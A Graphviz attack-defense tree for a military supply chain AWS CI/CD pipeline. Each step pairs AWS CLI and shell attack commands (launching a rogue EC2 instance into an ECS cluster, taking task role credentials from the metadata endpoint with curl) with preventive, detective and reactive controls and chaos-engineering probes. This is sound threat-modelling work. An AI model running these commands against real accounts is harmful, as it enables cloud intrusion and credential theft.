digraph AttackGraph {
    graph [
        fontname="Arial",
        splines=ortho,
        nodesep=0.5,
        ranksep=0.75,
        rankdir=TB,
        ordering="out",
        compound=true
    ];
    node [fontname="Arial"];

    "Root_Node" [label="Root Node: Military Supply Chain CI/CD Environment\nEC2-based DevSecOps Pipeline",
        shape=rectangle, style=filled, fillcolor="#C6E8D1", fontcolor="black"];
    
    "Final_Node" [label="Final Attack Goal: Privilege Escalation & Information Disclosure\nSTRIDE: Elevation of Privilege + Information Disclosure\nImpact: Access to classified supply chain data and credentials",
        shape=rectangle, style=filled, fillcolor="#C6E8D1", fontcolor="black"];

    // ============================================================================
    // BRANCH 1.x: Create Malicious EC2 Instance with ECS Configuration
    // ============================================================================

    "1-Preventive" [
        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
        label=<
            <b>1.0 Preventive: Block Unauthorized EC2 Launch</b><br/>
            <b>Classification: Preventive</b><br/>
            <b>Description:</b><br/>
            • Enforce IAM permission boundaries preventing ec2:RunInstances without approval<br/>
            • Implement Service Control Policies (SCPs) blocking instance launch outside approved subnets<br/>
            • Require MFA for ec2:RunInstances via IAM policy conditions<br/>
            • Block iam:PassRole for ECS instance profiles to unauthorized principals<br/>
            • Enforce EC2 Image Builder pipeline - only signed, scanned AMIs allowed<br/>
            • AWS Config rule: deny instances without approved instance profile tags<br/>
            • Restrict SSH key creation/usage via IAM policies (eliminate pwned key scenario)<br/>
            • Implement AWS Systems Manager Session Manager (no SSH keys required)<br/>
        >, margin=0.2
    ];

    "1-Attack" [
        shape=rectangle, style=filled, fillcolor="#F40B0B", fontcolor="white",
        label=<
            <b>1.1 Attack: Launch Malicious EC2 with ECS Agent</b><br/>
            <b>Command:</b><br/>
            aws ec2 run-instances \<br/>
            &#160;&#160;--image-id ami-07fde2ae86109a2af \<br/>
            &#160;&#160;--instance-type t2.micro \<br/>
            &#160;&#160;--iam-instance-profile ECS_SupplyChain_Role \<br/>
            &#160;&#160;--count 1 --key-name pwned \<br/>
            &#160;&#160;--user-data "file:///tmp/ecs_config.sh"<br/>
            <br/>
            # User data: /tmp/ecs_config.sh<br/>
            #!/bin/bash<br/>
            echo ECS_CLUSTER=SupplyChain-CICD-Cluster &gt;&gt; /etc/ecs/ecs.config<br/>
            echo ECS_BACKEND_HOST= &gt;&gt; /etc/ecs/ecs.config<br/>
            <br/>
            <b>Dependencies:</b><br/>
            • ec2:RunInstances permission (compromised DevOps account)<br/>
            • iam:PassRole for ECS_SupplyChain_Role instance profile<br/>
            • SSH key pair 'pwned' in us-gov-west-1 region<br/>
            • Knowledge of cluster name: SupplyChain-CICD-Cluster<br/>
            • ECS-optimized AMI access<br/>
            <br/>
            <b>Result:</b><br/>
            Malicious EC2 instance launched in supply chain VPC with ECS agent<br/>
            configured to auto-register to production cluster hosting ammunition<br/>
            tracking microservices. Instance profile grants ecs:RegisterContainerInstance.<br/>
            <br/>
            <b>TTP:</b> T1078.004 - Valid Accounts: Cloud Accounts<br/>
        >, margin=0.2
    ];

    "1-Chaos" [
        shape=rectangle, style="filled,rounded,bold", fillcolor="#FC8600", color="#FFA500", fontcolor="#000000",
        label=<
            <b>1.x SCE Experiment: Unauthorized EC2 Launch</b><br/>
            <b>Preventive Probe:</b> Attempt ec2:RunInstances with non-MFA session.<br/>
            Expected: IAM denies action due to MFA condition. Verify SCP blocks<br/>
            instance launch outside approved private subnets.<br/>
            <br/>
            <b>Detective Probe:</b> Launch instance with non-standard AMI or instance profile.<br/>
            Expected: GuardDuty generates finding "UnauthorizedAccess:EC2/MaliciousIPCaller"<br/>
            within 5 minutes. Config rule triggers non-compliance alert for missing tags.<br/>
            CloudTrail event triggers EventBridge rule → SNS alert to SOC.<br/>
            <br/>
            <b>Reactive Probe:</b> Simulate successful malicious launch.<br/>
            Expected: Lambda function auto-triggered by EventBridge terminates instance,<br/>
            creates forensic snapshot, applies quarantine security group, revokes<br/>
            temporary credentials via STS, notifies incident response team via PagerDuty.<br/>
        >, margin=0.2
    ];

    "1-Detective" [
        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
        label=<
            <b>1.2 Detective: Detect Unauthorized EC2 Launch</b><br/>
            <b>Classification: Detective</b><br/>
            <b>Description:</b><br/>
            • CloudTrail logs ec2:RunInstances event with user identity, source IP, parameters<br/>
            • GuardDuty detects anomalous EC2 launch patterns (unusual instance type, region, AMI)<br/>
            • AWS Config evaluates compliance: ec2-instance-profile-attached rule<br/>
            • CloudWatch Logs Insights query detects user-data scripts with ECS_CLUSTER modification<br/>
            • Security Hub aggregates findings: "EC2 instance launched with non-approved AMI"<br/>
            • EventBridge rule triggers on RunInstances with specific instance profile<br/>
            • IAM Access Analyzer detects iam:PassRole usage for ECS roles<br/>
            • VPC Flow Logs capture initial network connections from new instance<br/>
        >, margin=0.2
    ];

    "1-Reactive" [
        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
        label=<
            <b>1.3 Reactive: Respond to Malicious EC2 Launch</b><br/>
            <b>Classification: Reactive</b><br/>
            <b>Description:</b><br/>
            • Lambda function triggered by EventBridge rule on RunInstances event<br/>
            • Automated response workflow (Step Functions):<br/>
            &#160;&#160;1. Apply quarantine security group (deny all ingress/egress)<br/>
            &#160;&#160;2. Create EBS snapshot for forensic analysis (encrypted, tagged)<br/>
            &#160;&#160;3. Terminate instance via ec2:TerminateInstances<br/>
            &#160;&#160;4. Revoke IAM temporary credentials via sts:GetSessionToken deny policy<br/>
            &#160;&#160;5. Disable compromised IAM user/role access keys<br/>
            &#160;&#160;6. Create Security Hub insight and Detective investigation<br/>
            &#160;&#160;7. SNS notification to SOC with incident details<br/>
            • Systems Manager Automation runbook: isolate-and-snapshot-ec2<br/>
            • Update NACL to block source IP at subnet level<br/>
        >, margin=0.2
    ];

    // ============================================================================
    // BRANCH 2.x: Register EC2 Instance to Target ECS Cluster
    // ============================================================================

    "2-Preventive" [
        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
        label=<
            <b>2.0 Preventive: Block Unauthorized ECS Registration</b><br/>
            <b>Classification: Preventive</b><br/>
            <b>Description:</b><br/>
            • IAM policy restricts ecs:RegisterContainerInstance to approved instance profiles only<br/>
            • ECS cluster configured with containerInsights for enhanced monitoring<br/>
            • Implement ECS task placement constraints requiring specific instance attributes<br/>
            • Use ECS capacity providers with Auto Scaling Groups (controlled launch templates)<br/>
            • Tag-based authorization: require specific tags on instances for cluster registration<br/>
            • Network policy: ECS agent communication only via PrivateLink endpoints<br/>
            • AWS Config rule: ecs-containers-nonprivileged (prevent privileged containers)<br/>
            • Disable public ECS cluster endpoints, enforce VPC-only access<br/>
        >, margin=0.2
    ];

    "2-Attack" [
        shape=rectangle, style=filled, fillcolor="#F40B0B", fontcolor="white",
        label=<
            <b>2.1 Attack: Register Malicious Instance to ECS Cluster</b><br/>
            <b>Command:</b><br/>
            # Automatic registration via ECS agent on boot<br/>
            # Agent reads /etc/ecs/ecs.config and registers to SupplyChain-CICD-Cluster<br/>
            <br/>
            # Attacker verifies registration:<br/>
            aws ecs list-container-instances \<br/>
            &#160;&#160;--cluster SupplyChain-CICD-Cluster<br/>
            <br/>
            aws ecs describe-container-instances \<br/>
            &#160;&#160;--cluster SupplyChain-CICD-Cluster \<br/>
            &#160;&#160;--container-instances &lt;malicious-instance-arn&gt;<br/>
            <br/>
            <b>Dependencies:</b><br/>
            • EC2 instance from Step 1.1 successfully running<br/>
            • ECS agent service active and configured<br/>
            • Network connectivity to ECS service endpoints (ecs.us-gov-west-1.amazonaws.com)<br/>
            • IAM instance profile with ecs:RegisterContainerInstance permission<br/>
            • Valid ECS cluster name in configuration<br/>
            <br/>
            <b>Result:</b><br/>
            Malicious EC2 instance successfully registers as container instance in<br/>
            SupplyChain-CICD-Cluster. ECS scheduler now considers this instance for<br/>
            task placement. Attacker gains visibility into deployed services including<br/>
            ammunition-tracker, medical-supply-api, and ration-distribution microservices.<br/>
            Instance appears legitimate to ECS control plane.<br/>
            <br/>
            <b>TTP:</b> T1525 - Implant Internal Image<br/>
        >, margin=0.2
    ];

    "2-Chaos" [
        shape=rectangle, style="filled,rounded,bold", fillcolor="#FC8600", color="#FFA500", fontcolor="#000000",
        label=<
            <b>2.x SCE Experiment: Rogue ECS Registration</b><br/>
            <b>Preventive Probe:</b> Attempt to register EC2 instance without required<br/>
            resource tags (Environment=Production, DataClassification=Secret).<br/>
            Expected: ECS agent fails registration due to IAM policy tag condition.<br/>
            Verify capacity provider constraints prevent non-ASG instances from joining.<br/>
            <br/>
            <b>Detective Probe:</b> Register instance with anomalous attributes (wrong AZ,<br/>
            non-standard instance type, missing security tags).<br/>
            Expected: CloudWatch Events rule detects ECS RegisterContainerInstance API call<br/>
            from unknown instance ID. GuardDuty flags unusual ECS API activity pattern.<br/>
            Config rule triggers non-compliance for untagged container instance.<br/>
            Alert generated within 3 minutes to Security Hub.<br/>
            <br/>
            <b>Reactive Probe:</b> Simulate successful rogue registration.<br/>
            Expected: Lambda function deregisters container instance via<br/>
            ecs:DeregisterContainerInstance, drains running tasks, updates ECS cluster<br/>
            to block instance ARN, terminates underlying EC2 instance, creates<br/>
            CloudTrail Lake query for related API calls, escalates to Incident Response.<br/>
        >, margin=0.2
    ];

    "2-Detective" [
        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
        label=<
            <b>2.2 Detective: Detect Rogue ECS Registration</b><br/>
            <b>Classification: Detective</b><br/>
            <b>Description:</b><br/>
            • CloudTrail logs ecs:RegisterContainerInstance with instance ARN and cluster name<br/>
            • EventBridge rule monitors ECS API calls for new container instance registrations<br/>
            • CloudWatch Logs captures ECS agent logs showing cluster join events<br/>
            • AWS Config tracks ECS cluster membership changes (ecs-container-instances-count)<br/>
            • GuardDuty analyzes ECS API patterns for anomalous registration behavior<br/>
            • Custom CloudWatch metric: ContainerInstanceRegistrationRate (baseline deviation)<br/>
            • Security Hub finding: "Unrecognized container instance joined ECS cluster"<br/>
            • VPC Flow Logs show new instance communicating with ECS endpoints<br/>
            • Amazon Detective timeline shows instance launch → cluster registration correlation<br/>
        >, margin=0.2
    ];

    "2-Reactive" [
        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
        label=<
            <b>2.3 Reactive: Respond to Rogue ECS Registration</b><br/>
            <b>Classification: Reactive</b><br/>
            <b>Description:</b><br/>
            • Lambda function triggered by EventBridge on RegisterContainerInstance event<br/>
            • Automated response workflow (Systems Manager Automation):<br/>
            &#160;&#160;1. Set container instance status to DRAINING (prevent new task placement)<br/>
            &#160;&#160;2. Stop all running tasks on malicious instance gracefully<br/>
            &#160;&#160;3. Deregister container instance from cluster<br/>
            &#160;&#160;4. Apply isolation security group to underlying EC2 instance<br/>
            &#160;&#160;5. Create forensic snapshot of EBS volumes<br/>
            &#160;&#160;6. Collect ECS agent logs via CloudWatch Logs export<br/>
            &#160;&#160;7. Terminate EC2 instance<br/>
            &#160;&#160;8. Audit all tasks that ran on compromised instance<br/>
            &#160;&#160;9. Rotate credentials for any exposed task roles<br/>
            • Update ECS cluster capacity provider to exclude compromised instance type<br/>
            • Create Security Hub custom action for manual investigation<br/>
            • SNS notification to DevSecOps team with remediation summary<br/>
        >, margin=0.2
    ];

    // ============================================================================
    // BRANCH 3.x: Extract ECS Task Role Credentials
    // ============================================================================

    "3-Preventive" [
        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
        label=<
            <b>3.0 Preventive: Block Credential Extraction</b><br/>
            <b>Classification: Preventive</b><br/>
            <b>Description:</b><br/>
            • Disable SSH access entirely - use AWS Systems Manager Session Manager only<br/>
            • Implement IMDSv2 on all EC2 instances (prevents SSRF to metadata service)<br/>
            • ECS task networking: awsvpc mode with dedicated ENI (isolated metadata endpoint)<br/>
            • Container security: run as non-root user, read-only root filesystem<br/>
            • Remove docker socket access from containers (no docker exec capability)<br/>
            • Implement AppArmor/SELinux profiles restricting metadata service access<br/>
            • Network policy: block container access to 169.254.170.2 via iptables<br/>
            • Use ECS Exec with IAM authorization instead of SSH (session logging to S3)<br/>
            • Secrets Manager integration: no credentials in environment variables<br/>
            • Task IAM roles with time-bound sessions (1-hour maximum)<br/>
            • Implement credential rotation via Secrets Manager (15-minute intervals)<br/>
        >, margin=0.2
    ];

    "3-Attack" [
        shape=rectangle, style=filled, fillcolor="#F40B0B", fontcolor="white",
        label=<
            <b>3.1 Attack: Extract Task Role Credentials from Containers</b><br/>
            <b>Command:</b><br/>
            # SSH into compromised EC2 instance<br/>
            ssh -i pwned.pem ec2-user@10.100.5.47<br/>
            <br/>
            # List running containers (ammunition-tracker, medical-supply-api)<br/>
            docker ps<br/>
            <br/>
            # Access container with privileged supply chain service<br/>
            docker exec -it ammunition-tracker-container /bin/bash<br/>
            <br/>
            # Extract task role credentials from ECS metadata endpoint<br/>
            curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI<br/>
            <br/>
            # Alternative: from host EC2 instance<br/>
            curl http://169.254.170.2/v2/credentials/a1b2c3d4-task-role-guid<br/>
            <br/>
            # Captured credentials:<br/>
            {<br/>
            &#160;&#160;"AccessKeyId": "ASIA...",<br/>
            &#160;&#160;"SecretAccessKey": "...",<br/>
            &#160;&#160;"Token": "...",<br/>
            &#160;&#160;"Expiration": "2024-01-15T18:30:00Z",<br/>
            &#160;&#160;"RoleArn": "arn:aws-us-gov:iam::123456789:role/SupplyChain-AmmoTracker-TaskRole"<br/>
            }<br/>
            <br/>
            <b>Dependencies:</b><br/>
            • SSH access to compromised EC2 instance (pwned.pem key)<br/>
            • ECS tasks scheduled on attacker-controlled instance<br/>
            • Docker daemon access on EC2 host<br/>
            • Network access to ECS task metadata endpoint (169.254.170.2)<br/>
            • Running containers with IAM task roles attached<br/>
            <br/>
            <b>Result:</b><br/>
            Attacker extracts temporary credentials for SupplyChain-AmmoTracker-TaskRole<br/>
            with permissions: s3:GetObject on classified ammunition inventory data,<br/>
            dynamodb:Query on supply chain database, kms:Decrypt for encrypted logistics<br/>
            data, secretsmanager:GetSecretValue for database passwords. Credentials valid<br/>
            for 1 hour. Attacker can now access classified warfighter supply data, exfiltrate<br/>
            ammunition tracking information, and potentially modify supply chain records.<br/>
            <br/>
            <b>TTP:</b> T1552.005 - Unsecured Credentials: Cloud Instance Metadata API<br/>
        >, margin=0.2
    ];

    "3-Chaos" [
        shape=rectangle, style="filled,rounded,bold", fillcolor="#FC8600", color="#FFA500", fontcolor="#000000",
        label=<
            <b>3.x SCE Experiment: Credential Extraction Attempt</b><br/>
            <b>Preventive Probe:</b> Attempt to access metadata service from container.<br/>
            Expected: IMDSv2 requires PUT request with token (blocks simple curl).<br/>
            iptables rules block 169.254.170.2 access. Docker exec fails due to<br/>
            non-root user and read-only filesystem. Session Manager enforces IAM<br/>
            authorization (no SSH key access). Verify awsvpc networking isolates<br/>
            task metadata endpoint per container.<br/>
            <br/>
            <b>Detective Probe:</b> Simulate metadata service access from container.<br/>
            Expected: VPC Flow Logs capture connection attempt to 169.254.170.2.<br/>
            GuardDuty generates "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration"<br/>
            finding. CloudWatch Logs Insights detects curl commands to metadata endpoint.<br/>
            AWS X-Ray traces show anomalous credential retrieval pattern. CloudTrail<br/>
            logs subsequent API calls using extracted credentials from unusual source IP.<br/>
            Alert generated within 2 minutes.<br/>
            <br/>
            <b>Reactive Probe:</b> Simulate successful credential extraction and usage.<br/>
            Expected: Lambda function detects credential usage from non-ECS source IP,<br/>
            immediately revokes STS session via IAM policy update. Step Functions workflow:<br/>
            1) Invalidate all active sessions for compromised role, 2) Rotate task role<br/>
            credentials, 3) Stop all tasks using compromised role, 4) Redeploy tasks with<br/>
            new role, 5) Create Detective investigation, 6) Audit S3/DynamoDB access logs<br/>
            for data exfiltration, 7) Escalate to CISO for classified data breach protocol.<br/>
        >, margin=0.2
    ];

    "3-Detective" [
        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
        label=<
            <b>3.2 Detective: Detect Credential Extraction</b><br/>
            <b>Classification: Detective</b><br/>
            <b>Description:</b><br/>
            • VPC Flow Logs capture traffic to 169.254.170.2 (ECS metadata endpoint)<br/>
            • GuardDuty detects credential exfiltration patterns:<br/>
            &#160;&#160;- UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration<br/>
            &#160;&#160;- Recon:IAMUser/MaliciousIPCaller.Custom<br/>
            • CloudWatch Logs Insights queries detect metadata service access:<br/>
            &#160;&#160;fields @timestamp, @message | filter @message like /169.254.170.2/<br/>
            • CloudTrail logs API calls using extracted credentials (source IP mismatch)<br/>
            • IAM Access Analyzer detects credential usage from unexpected network location<br/>
            • AWS X-Ray traces show credential retrieval followed by S3/DynamoDB access<br/>
            • Security Hub aggregates findings: "ECS task credentials accessed from host"<br/>
            • Custom CloudWatch metric: MetadataServiceAccessCount (anomaly detection)<br/>
            • Amazon Detective correlates: SSH session → docker exec → metadata access → API calls<br/>
            • Session Manager logs (if used) show command history and access patterns<br/>
        >, margin=0.2
    ];

    "3-Reactive" [
        shape=rectangle, style=filled, fillcolor="#0683FF", fontcolor="white",
        label=<
            <b>3.3 Reactive: Respond to Credential Compromise</b><br/>
            <b>Classification: Reactive</b><br/>
            <b>Description:</b><br/>
            • Lambda function triggered by GuardDuty finding or CloudTrail anomaly<br/>
            • Immediate credential revocation workflow (Step Functions):<br/>
            &#160;&#160;1. Attach explicit deny policy to compromised IAM role (all actions)<br/>
            &#160;&#160;2. Revoke all active STS sessions for the role<br/>
            &#160;&#160;3. Update IAM role trust policy to block compromised instance ARN<br/>
            &#160;&#160;4. Stop all ECS tasks using the compromised task role<br/>
            &#160;&#160;5. Create new IAM role with identical permissions (SupplyChain-AmmoTracker-TaskRole-v2)<br/>
            &#160;&#160;6. Update ECS task definition to use new role<br/>
            &#160;&#160;7. Redeploy tasks on verified, clean container instances<br/>
            &#160;&#160;8. Rotate all secrets in AWS Secrets Manager accessed by compromised role<br/>
            &#160;&#160;9. Audit CloudTrail for all API calls made with stolen credentials<br/>
            &#160;&#160;10. Check S3 access logs for data exfiltration (ammunition inventory data)<br/>
            &#160;&#160;11. Query DynamoDB for unauthorized modifications to supply chain records<br/>
            • Forensic analysis:<br/>
            &#160;&#160;- Export CloudWatch Logs for compromised container<br/>
            &#160;&#160;- Create EBS snapshot of compromised EC2 instance<br/>
            &#160;&#160;- Use Amazon Detective to build attack timeline<br/>
            &#160;&#160;- CloudTrail Lake query for all related events<br/>
            • Incident response:<br/>
            &#160;&#160;- SNS notification to security team with severity: CRITICAL<br/>
            &#160;&#160;- PagerDuty alert to on-call incident responder<br/>
            &#160;&#160;- Create Security Hub insight for executive dashboard<br/>
            &#160;&#160;- Initiate classified data breach protocol (DoD reporting requirements)<br/>
            &#160;&#160;- Engage AWS Enterprise Support for forensic assistance<br/>
        >, margin=0.2
    ];

    // ============================================================================
    // GRAPH STRUCTURE AND ALIGNMENT
    // ============================================================================

    // Rank alignment for visual clarity
    {rank=same; "1-Chaos"; "1-Attack"}
    {rank=same; "1-Detective"; "1-Reactive"}
    {rank=same; "2-Chaos"; "2-Attack"}
    {rank=same; "2-Detective"; "2-Reactive"}
    {rank=same; "3-Chaos"; "3-Attack"}
    {rank=same; "3-Detective"; "3-Reactive"}

    // Main attack flow
    "Root_Node" -> "1-Preventive" [label="Attack Path Begins", fontsize=10];
    "1-Preventive" -> "1-Attack" [label="Preventive Controls Bypassed", fontsize=10, color="#FF0000"];
    "1-Attack" -> "1-Detective" [label="Attack Executed", fontsize=10];
    "1-Attack" -> "1-Reactive" [label="Attack Executed", fontsize=10];
    
    "1-Detective" -> "2-Preventive" [label="Detection Triggers Next Phase", fontsize=10];
    "1-Reactive" -> "2-Preventive" [label="Response Enables Next Phase", fontsize=10];

    "2-Preventive" -> "2-Attack" [label="Preventive Controls Bypassed", fontsize=10, color="#FF0000"];
    "2-Attack" -> "2-Detective" [label="Attack Executed", fontsize=10];
    "2-Attack" -> "2-Reactive" [label="Attack Executed", fontsize=10];

    "2-Detective" -> "3-Preventive" [label="Detection Triggers Final Phase", fontsize=10];
    "2-Reactive" -> "3-Preventive" [label="Response Enables Final Phase", fontsize=10];

    "3-Preventive" -> "3-Attack" [label="Preventive Controls Bypassed", fontsize=10, color="#FF0000"];
    "3-Attack" -> "3-Detective" [label="Attack Executed", fontsize=10];
    "3-Attack" -> "3-Reactive" [label="Attack Executed", fontsize=10];

    "3-Detective" -> "Final_Node" [label="Attack Goal Achieved", fontsize=10, color="#FF0000"];
    "3-Reactive" -> "Final_Node" [label="Attack Mitigated", fontsize=10, color="#00FF00"];

    // Chaos engineering connections (dashed orange lines)
    "1-Attack" -> "1-Chaos" [style=dashed, color="#FC8600", label="SCE Test", fontsize=9];
    "2-Attack" -> "2-Chaos" [style=dashed, color="#FC8600", label="SCE Test", fontsize=9];
    "3-Attack" -> "3-Chaos" [style=dashed, color="#FC8600", label="SCE Test", fontsize=9];
}